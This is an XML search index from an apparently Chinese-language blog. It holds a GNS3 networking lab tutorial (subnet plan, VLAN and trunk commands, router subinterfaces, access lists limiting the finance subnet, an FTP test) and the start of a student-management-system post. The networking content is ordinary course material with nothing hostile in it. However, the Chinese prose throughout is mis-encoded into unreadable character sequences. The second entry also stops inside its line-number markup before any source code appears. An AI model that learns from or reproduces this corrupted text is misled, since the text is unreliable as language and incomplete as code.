<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>GNS3ç»„ç½‘å®éªŒ</title>
      <link href="/2024/11/11/gns/"/>
      <url>/2024/11/11/gns/</url>
      
        <content type="html"><![CDATA[<h3 id="å®éªŒèƒŒæ™¯"><a href="#å®éªŒèƒŒæ™¯" class="headerlink" title="å®éªŒèƒŒæ™¯"></a>å®éªŒèƒŒæ™¯</h3><p><img src="/img/network/bg.png"></p><h3 id="å®éªŒè¦æ±‚"><a href="#å®éªŒè¦æ±‚" class="headerlink" title="å®éªŒè¦æ±‚"></a>å®éªŒè¦æ±‚</h3><p><img src="/img/network/require.png"></p><h3 id="å®éªŒè¿‡ç¨‹"><a href="#å®éªŒè¿‡ç¨‹" class="headerlink" title="å®éªŒè¿‡ç¨‹"></a>å®éªŒè¿‡ç¨‹</h3><h4 id="æ„å»ºæ‹“æ‰‘ç»“æ„"><a href="#æ„å»ºæ‹“æ‰‘ç»“æ„" class="headerlink" title="æ„å»ºæ‹“æ‰‘ç»“æ„"></a>æ„å»ºæ‹“æ‰‘ç»“æ„</h4><p>åˆ†æé¢˜æ„ï¼Œåˆ†å…¬å¸1å’Œåˆ†å…¬å¸2å…±ç”¨<code>192.168.1.0/24</code>çš„åœ°å€å—ï¼Œåˆ†å…¬å¸1çš„ä¸»æœºæ•°ä¸º100ï¼Œåˆ†å…¬å¸2çš„ä¸»æœºæ•°ä¸º120ï¼Œç”±æ­¤å¯ä»¥å°†åœ°å€å—<code>192.168.1.0/24</code>å¹³å‡åˆ†ä¸ºä¸¤å—åˆ†åˆ«ç»™åˆ†å…¬å¸1å’Œåˆ†å…¬å¸2ï¼Œä»¥ä¸‹åˆ†é…ç¤ºä¾‹ä¾›å‚è€ƒ<br>å°†<code>192.168.1.0</code>åˆ°<code>192.168.1.127</code>åˆ†ç»™åˆ†å…¬å¸1ï¼Œå­ç½‘æ©ç ä¸º<code>255.255.255.128</code>ï¼Œå¹¿æ’­åœ°å€ä¸º<code>192.168.1.127</code>,ç½‘å…³åœ°å€ä¸º<code>192.168.1.126</code><br>å°†<code>192.168.1.128</code>åˆ°<code>192.168.1.255</code>åˆ†ç»™åˆ†å…¬å¸2ï¼Œå­ç½‘æ©ç ä¸º<code>255.255.255.128</code>ï¼Œå¹¿æ’­åœ°å€ä¸º<code>192.168.1.255</code>ï¼Œç½‘å…³åœ°å€ä¸º<code>192.168.1.254</code><br>è´¢åŠ¡éƒ¨é—¨å•ç‹¬ä½¿ç”¨å‰ç¼€ä¸º<code>192.168.2.0/24</code>åœ°å€å—ä¸­çš„åœ°å€<br>æœåŠ¡å™¨å•ç‹¬ä½¿ç”¨å‰ç¼€ä¸º<code>192.168.3.0/24</code>åœ°å€å—ä¸­çš„åœ°å€<br>æ ¹æ®é¢˜æ„ï¼Œæ„å»ºå¦‚ä¸‹ç½‘ç»œæ‹“æ‰‘å›¾</p><p><img src="/img/network/tuopu.png"></p><p>åœ¨GNS3æ“ä½œç•Œé¢æ„å»ºå¦‚ä¸‹ç½‘ç»œæ‹“æ‰‘å›¾<br><img src="/img/network/1.png"></p><p>è¿è¡Œåå¦‚ä¸‹å›¾æ‰€ç¤º<br><img src="/img/network/2.png"></p><h4 id="é…ç½®å‚æ•°"><a href="#é…ç½®å‚æ•°" class="headerlink" title="é…ç½®å‚æ•°"></a>é…ç½®å‚æ•°</h4><h5 id="ä¸»æœº"><a href="#ä¸»æœº" class="headerlink" title="ä¸»æœº"></a>ä¸»æœº</h5><p>ä¸»æœºéœ€è¦é…ç½®<strong>ä¸»æœºåœ°å€</strong>ã€<strong>å­ç½‘æ©ç </strong>ã€<strong>å¹¿æ’­åœ°å€</strong>ã€<strong>ç½‘å…³åœ°å€</strong><br>ä»¥ä¸‹ä¸»æœºä»¥<strong>Firefox</strong>ä¸ºä¾‹</p><ul><li>åˆ†å…¬å¸1<br>åŒå‡»æ‰“å¼€ä¸»æœºï¼Œæ‰“å¼€åæ“ä½œå¦‚ä¸‹<br><img src="/img/network/3.png"><br>é…ç½®<strong>ä¸»æœºåœ°å€</strong>ã€<strong>å¹¿æ’­åœ°å€</strong>ã€<strong>ç½‘å…³åœ°å€</strong>ï¼Œç‚¹å‡»Applyåº”ç”¨<br><img src="/img/network/4.png"></li><li>åˆ†å…¬å¸2<br>æ“ä½œåŒåˆ†å…¬å¸1ï¼Œæ¼”ç¤ºå¦‚ä¸‹<br><img src="/img/network/5.png"></li><li>è´¢åŠ¡éƒ¨é—¨<br><img src="/img/network/6.png"></li></ul><h5 id="æœåŠ¡å™¨"><a href="#æœåŠ¡å™¨" class="headerlink" title="æœåŠ¡å™¨"></a>æœåŠ¡å™¨</h5><p>æœåŠ¡å™¨éœ€è¦é…ç½®<strong>æœåŠ¡å™¨åœ°å€</strong>ã€<strong>å­ç½‘æ©ç </strong>ã€<strong>ç½‘å…³åœ°å€</strong> </p><ul><li>DNSæœåŠ¡å™¨<br>é¼ æ ‡å³é”®ç‚¹å‡»DNSæœåŠ¡å™¨ï¼Œé€‰æ‹©<code>Configure</code>ï¼Œè¿›å…¥ä»¥ä¸‹é¡µé¢åç‚¹å‡»<code>Edit</code><br><img src="/img/network/7.png"><br>ä¿®æ”¹DNSæœåŠ¡å™¨é…ç½®ï¼Œç¤ºä¾‹å¦‚ä¸‹<br><img src="/img/network/8.png"><br>ç‚¹å‡»<code>Save</code>ä¿å­˜ï¼Œç‚¹å‡»<code>Apply</code>åº”ç”¨ï¼Œç‚¹å‡»<code>OK</code>é€€å‡º</li><li>HTTPæœåŠ¡å™¨<br>æ“ä½œåŒDNSæœåŠ¡å™¨ï¼ŒHTTPæœåŠ¡å™¨é…ç½®å¦‚ä¸‹<br><img src="/img/network/9.png"><br>ç‚¹å‡»<code>Save</code>ä¿å­˜ï¼Œç‚¹å‡»<code>Apply</code>åº”ç”¨ï¼Œç‚¹å‡»<code>OK</code>é€€å‡º</li><li>FTPæœåŠ¡å™¨<br>æ“ä½œåŒDNSæœåŠ¡å™¨ï¼ŒFTPæœåŠ¡å™¨é…ç½®å¦‚ä¸‹<br><img src="/img/network/10.png"><br>ç‚¹å‡»<code>Save</code>ä¿å­˜ï¼Œç‚¹å‡»<code>Apply</code>åº”ç”¨ï¼Œç‚¹å‡»<code>OK</code>é€€å‡º</li></ul><h5 id="äº¤æ¢æœº"><a href="#äº¤æ¢æœº" class="headerlink" title="äº¤æ¢æœº"></a>äº¤æ¢æœº</h5><p>äº¤æ¢æœºéœ€è¦é…ç½® <strong>VLAN</strong>ã€<strong>æ¨¡å¼</strong><br>æ¨¡å¼åŒ…æ‹¬<strong>trunk</strong>æ¨¡å¼å’Œ<strong>access</strong>æ¨¡å¼ï¼Œäº¤æ¢æœºä¸äº¤æ¢æœºä¹‹é—´ã€äº¤æ¢æœºä¸è·¯ç”±å™¨ä¹‹é—´ä¸º <strong>trunk</strong>æ¨¡å¼ï¼Œäº¤æ¢æœºä¸ä¸»æœºã€äº¤æ¢æœºä¸è·¯ç”±å™¨ä¹‹é—´ä¸º <strong>access</strong>æ¨¡å¼<br>ä»¥ä¸‹ä¸ºé…ç½®äº¤æ¢æœºæ—¶å¯èƒ½ç”¨åˆ°çš„å‘½ä»¤</p><ol><li><code>en</code><br>èµ‹äºˆæƒé™,<code>(switch)&gt;</code>ä¼šå˜æˆ <code>(switch)#</code></li><li><code>conf</code><br><strong>config</strong>å‘½ä»¤çš„ç¼©å†™ï¼Œè¿›å…¥é…ç½®æ¨¡å¼</li><li><code>vlan [VLANid]</code><br>åˆ›å»ºVLAN</li><li><code>int [æ¥å£å·]</code><br>åˆ‡æ¢æ¥å£</li><li><code>switchport mode trunk</code><br>äº¤æ¢æœºä¸äº¤æ¢æœºä¹‹é—´ã€äº¤æ¢æœºä¸è·¯ç”±å™¨ä¹‹é—´ä¸º <strong>trunk</strong>æ¨¡å¼</li><li><code>switchport mode access</code><br>äº¤æ¢æœºä¸ä¸»æœºã€äº¤æ¢æœºä¸è·¯ç”±å™¨ä¹‹é—´ä¸º <strong>access</strong>æ¨¡å¼</li><li><code>switchport access vlan [VLANIid]</code><br>é…ç½®è¯¥æ¥å£å±äºå“ªä¸€ä¸ªVLAN</li><li><code>exit</code><br>é€€å‡ºå½“å‰æ¨¡å¼</li><li><code>write</code><br>ä¿å­˜é…ç½®</li></ol><p>åœ¨é…ç½®äº¤æ¢æœºçš„è¿‡ç¨‹ä¸­éœ€è¦æ³¨æ„</p><ol><li>ä½¿ç”¨<code>int</code>å‘½ä»¤åˆ‡æ¢è¿›å»çš„ç»“åˆæ˜¯ä»€ä¹ˆæ¥å£ï¼Œæ˜¯å’Œäº¤æ¢æœºæˆ–è·¯ç”±å™¨è¿æ¥çš„æ¥å£ï¼Œè¿˜æ˜¯å’Œä¸»æœºæˆ–æœåŠ¡å™¨è¿æ¥çš„æ¥å£ï¼Œæ¥å£ä¸åŒæ¨¡å¼ä¸åŒ(trunkæˆ–access)</li><li><strong>ä¸€å®š</strong>è¦å…ˆåˆ›å»ºVLANï¼Œå†é…ç½®VLANï¼Œä¹Ÿå°±æ˜¯è¦å…ˆæ‰§è¡Œ<code>vlan [VLANid]</code>,æ‰å¯ä»¥æ‰§è¡Œ<code>switchport mode access</code>å’Œ<code>switchport access vlan [VLANIid]</code></li></ol><p>é¼ æ ‡åŒå‡»äº¤æ¢æœºæ‰“å¼€äº¤æ¢æœºé…ç½®ç•Œé¢ï¼Œä»¥ä¸‹æ˜¯sw1çš„é…ç½®ç¤ºä¾‹å›¾<br><img src="/img/network/11.png"><br>å…¶ä½™äº¤æ¢æœºå‡å‚è€ƒsw1çš„é…ç½®<br>ä»¥ä¸‹æ˜¯sw2çš„é…ç½®ç¤ºä¾‹å›¾<br><img src="/img/network/12.png"><br>ä»¥ä¸‹æ˜¯sw3çš„é…ç½®ç¤ºä¾‹å›¾<br><img src="/img/network/13.png"><br>ä»¥ä¸‹æ˜¯sw4çš„é…ç½®ç¤ºä¾‹å›¾<br><img src="/img/network/14.png"><br>ä»¥ä¸‹æ˜¯sw5çš„é…ç½®ç¤ºä¾‹å›¾ï¼Œ<strong>sw5æ˜¯æ ¸å¿ƒäº¤æ¢æœºï¼Œæœ¬è´¨ä¸Šä¹Ÿæ˜¯äº¤æ¢æœºï¼Œé…ç½®ç›¸æ¯”å…¶ä»–äº¤æ¢æœºç›¸å¯¹å¤æ‚ï¼Œè¯·ä»”ç»†çœ‹è¿™ä¸ªéƒ¨åˆ†</strong><br><img src="/img/network/15.png"><br><img src="/img/network/16.png"></p><h5 id="è·¯ç”±å™¨"><a href="#è·¯ç”±å™¨" class="headerlink" title="è·¯ç”±å™¨"></a>è·¯ç”±å™¨</h5><p>è·¯ç”±å™¨éœ€è¦åˆ›å»ºVLANã€é…ç½® <strong>å­æ¥å£</strong>ï¼Œæ¯ä¸€ä¸ªå­æ¥å£éœ€è¦é…ç½®VLANå’ŒVLANä¸‹çš„ç½‘å…³åœ°å€<br>ä»¥ä¸‹ä¸ºé…ç½®è·¯ç”±å™¨æ—¶å¯èƒ½ç”¨åˆ°çš„å‘½ä»¤</p><ol><li><code>en</code><br>èµ‹äºˆæƒé™,<code>Router&gt;</code>ä¼šå˜æˆ <code>Router#</code></li><li><code>conf</code><br>è¿›å…¥é…ç½®æ¨¡å¼</li><li><code>vlan [VLANid]</code><br>åˆ›å»ºVALN</li><li><code>int</code><br>åˆ‡æ¢æ¥å£</li><li><code>encapsulation dot1Q [VLANid]</code><br>é…ç½®å­æ¥å£vlanå·ï¼Œå°è£…æ ¼å¼ä¸º802.1q</li><li><code>ip address [ç½‘å…³åœ°å€] [å­ç½‘æ©ç ]</code></li><li><code>exit</code><br>é€€å‡ºå½“å‰æ¨¡å¼</li><li><code>write</code><br>ä¿å­˜é…ç½®</li></ol><p>é¼ æ ‡åŒå‡»è·¯ç”±å™¨æ‰“å¼€è·¯ç”±å™¨é…ç½®ç•Œé¢ï¼Œä»¥ä¸‹æ˜¯è·¯ç”±å™¨çš„é…ç½®ç¤ºä¾‹å›¾<br><img src="/img/network/17.png"><br><img src="/img/network/18.png"></p><h4 id="æ¼”ç¤º"><a href="#æ¼”ç¤º" class="headerlink" title="æ¼”ç¤º"></a>æ¼”ç¤º</h4><p>å¦‚æœä½ èµ°åˆ°äº†è¿™é‡Œï¼Œæ­å–œä½ æˆåŠŸå®Œæˆäº†ç»„ç½‘å®éªŒçš„åŸºç¡€éƒ¨åˆ†ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å¯ä»¥è¯•ç€æ‰“å¼€æŸä¸€ä¸ªä¸»æœºå»æµ‹è¯•ç½‘ç»œæ˜¯å¦è¿é€šã€‚<br>ä¸‹é¢ä»¥åˆ†å…¬å¸1çš„Firefoxä¸ºä¾‹ï¼Œå°è¯•ç”¨<code>ping</code>å‘½ä»¤æµ‹è¯•ä¸åˆ†å…¬å¸2çš„ä¸»æœºä»¥åŠä¸æœåŠ¡å™¨ä¹‹é—´çš„è¿é€šæ€§ï¼Œæ¼”ç¤ºæ•ˆæœå¦‚ä¸‹å›¾<br><img src="/img/network/19.png"><br><img src="/img/network/20.png"></p><p><strong>Congratulation! You did it successfully!</strong></p><hr><h3 id="è¿›é˜¶å®éªŒ"><a href="#è¿›é˜¶å®éªŒ" class="headerlink" title="è¿›é˜¶å®éªŒ"></a>è¿›é˜¶å®éªŒ</h3><h4 id="æ„å»ºç½‘ç»œæ‹“æ‰‘ç»“æ„"><a href="#æ„å»ºç½‘ç»œæ‹“æ‰‘ç»“æ„" class="headerlink" title="æ„å»ºç½‘ç»œæ‹“æ‰‘ç»“æ„"></a>æ„å»ºç½‘ç»œæ‹“æ‰‘ç»“æ„</h4><p><img src="/img/network/21.png"></p><h4 id="é…ç½®å‚æ•°-1"><a href="#é…ç½®å‚æ•°-1" class="headerlink" title="é…ç½®å‚æ•°"></a>é…ç½®å‚æ•°</h4><h5 id="ä¸»æœº-1"><a href="#ä¸»æœº-1" class="headerlink" title="ä¸»æœº"></a>ä¸»æœº</h5><p><img src="/img/network/22.png"><br><img src="/img/network/23.png"></p><h5 id="è·¯ç”±å™¨-1"><a href="#è·¯ç”±å™¨-1" class="headerlink" title="è·¯ç”±å™¨"></a>è·¯ç”±å™¨</h5><p><img src="/img/network/24.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">access-list 101 permit ip 192.168.2.0 0.0.0.255 192.168.3.0 0.0.0.255</span><br><span class="line">access-list 101 deny ip 192.168.2.0 0.0.0.255 any</span><br><span class="line">int G0/0.4</span><br><span class="line">ip access-group 101 <span class="keyword">in</span></span><br><span class="line"></span><br><span class="line">access-list 102 deny ip 192.168.1.0 0.0.0.255 192.168.2.0 0.0.0.255</span><br><span class="line">access-list 102 permit ip any any</span><br><span class="line">int G0/0.2</span><br><span class="line">ip access-group 102 <span class="keyword">in</span></span><br><span class="line">int G0/0.3</span><br><span class="line">ip access-group 102 <span class="keyword">in</span></span><br></pre></td></tr></table></figure><h5 id="æœåŠ¡å™¨-1"><a href="#æœåŠ¡å™¨-1" class="headerlink" title="æœåŠ¡å™¨"></a>æœåŠ¡å™¨</h5><ul><li>HTTPæœåŠ¡å™¨<br><img src="/img/network/25.png"></li><li>DNSæœåŠ¡å™¨<br><img src="/img/network/27.png"><br><img src="/img/network/28.png"></li></ul><h4 id="æ¼”ç¤º-1"><a href="#æ¼”ç¤º-1" class="headerlink" title="æ¼”ç¤º"></a>æ¼”ç¤º</h4><ol><li>è´¢åŠ¡éƒ¨é—¨åªèƒ½è®¿é—®æœåŠ¡å™¨ï¼Œä¸èƒ½è®¿é—®å…¶ä»–ç½‘æ®µ<br><img src="/img/network/29.png"><br><img src="/img/network/30.png"><br><img src="/img/network/31.png"><br><img src="/img/network/32.png"></li><li>ä¸¤ä¸ªåˆ†å…¬å¸ä¸èƒ½è®¿é—®è´¢åŠ¡éƒ¨é—¨ï¼Œå…¶ä½™éƒ½å¯ä»¥è®¿é—®<br><img src="/img/network/33.png"><br><img src="/img/network/34.png"></li><li>åœ¨åˆ†å…¬å¸ 1 å’Œåˆ†å…¬å¸ 2 çš„å®¢æˆ·ç«¯ä¸Šåˆ†åˆ«é…ç½® FTP å®¢æˆ·ç«¯ï¼ˆä½¿ç”¨ Kali ç³»ç»Ÿç»ˆç«¯ï¼‰å’ŒHTTP å®¢æˆ·ç«¯ï¼Œå¹¶å¯¹ FTPæœåŠ¡å™¨ã€HTTP æœåŠ¡å™¨å’Œ DNS æœåŠ¡å™¨è¿›è¡Œç›¸å…³é…ç½®ã€‚FTP å®¢æˆ·ç«¯èƒ½è®¿é—® FTP æœåŠ¡å™¨ï¼Œèƒ½å¤Ÿå®ç°ä¸Šä¼ ã€ä¸‹è½½æ–‡ä»¶åŠŸèƒ½ã€‚HTTP å®¢æˆ·ç«¯èƒ½é€šè¿‡åŸŸåè®¿é—® HTTP æœåŠ¡å™¨ï¼Œå¹¶èƒ½æ­£å¸¸è®¿é—®ç½‘é¡µã€‚<br><img src="/img/network/35.png"><br>åœ¨æ¼”ç¤ºFTPä¸‹è½½æ–‡ä»¶å‰ï¼Œæˆ‘ä»¬å…ˆåœ¨FTPæœåŠ¡å™¨ä¸Šåˆ›å»ºä¸€ä¸ªæµ‹è¯•æ–‡ä»¶<br><img src="/img/network/36.png"><br><img src="/img/network/37.png"><br>ç„¶ååœ¨å®¢æˆ·ç«¯è¿æ¥FTPæœåŠ¡å™¨ï¼Œå¹¶ä¸‹è½½&#x2F;ä¸Šä¼ æ–‡ä»¶<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.168.3.3</span><br></pre></td></tr></table></figure></li></ol><ul><li>å®¢æˆ·ç«¯ä»FTPæœåŠ¡å™¨ä¸‹è½½æ–‡ä»¶<br><img src="/img/network/38.png"><br><img src="/img/network/39.png"> </li><li>å®¢æˆ·ç«¯å‘FTPæœåŠ¡å™¨ä¸Šä¼ æ–‡ä»¶<br><img src="/img/network/40.png"><br><img src="/img/network/41.png"></li></ul><hr><p><strong>åè®°</strong><br>æ„Ÿè°¢<strong>Niko233</strong>å¤§ä½¬å¯¹ç¬”è€…çš„å¸®åŠ©ä¸æ”¯æŒï¼ï¼ï¼</p><p>PSï¼šå¦‚æœæ–‡ç« å¯¹ä½ çš„å®éªŒæœ‰ä¸€ç‚¹ç‚¹å¸®åŠ©,é‚£å°±å¤ªå¥½å•¦ï¼ï¼ï¼å¸Œæœ›è¿™ç¯‡æ–‡ç« å¯ä»¥å¸¦ä½ è§£å†³GNS3ç»„ç½‘å®éªŒé‡åˆ°çš„é—®é¢˜ã€‚æœ€å,äº²äº²å¯ä»¥è¯•è¯•æœ€ä¸‹é¢çš„ <strong>æŠ•å–‚ä½œè€…</strong> åŠŸèƒ½å“ŸğŸ˜˜ğŸ˜˜ğŸ˜˜</p>]]></content>
      
      
      <categories>
          
          <category> Course </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GNS3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å­¦ç”Ÿç®¡ç†ç³»ç»Ÿ</title>
      <link href="/2024/10/28/mysql3/"/>
      <url>/2024/10/28/mysql3/</url>
      
        <content type="html"><![CDATA[<h3 id="å®éªŒè¦æ±‚"><a href="#å®éªŒè¦æ±‚" class="headerlink" title="å®éªŒè¦æ±‚"></a>å®éªŒè¦æ±‚</h3><p><img src="/img/mysql/request.png"></p><h3 id="æ•ˆæœå±•ç¤º"><a href="#æ•ˆæœå±•ç¤º" class="headerlink" title="æ•ˆæœå±•ç¤º"></a>æ•ˆæœå±•ç¤º</h3><p><img src="/img/mysql/1.png"><br><img src="/img/mysql/2.png"><br><img src="/img/mysql/3.png"><br><img src="/img/mysql/4.png"><br><img src="/img/mysql/5.png"><br><img src="/img/mysql/6.png"><br><img src="/img/mysql/7.png"><br><img src="/img/mysql/8.png"><br><img src="/img/mysql/9.png"><br><img src="/img/mysql/10.png"></p><hr><p><strong>æºç </strong><br><strong>æ³¨ï¼šä»æœ‰å¾ˆå¤šå¯ä»¥å®Œå–„çš„åœ°æ–¹ï¼Œä»…ä¾›å‚è€ƒ</strong><br><strong>ç›¸ä¿¡ä½ å¯ä»¥åšå¾—æ›´å¥½ï¼</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span 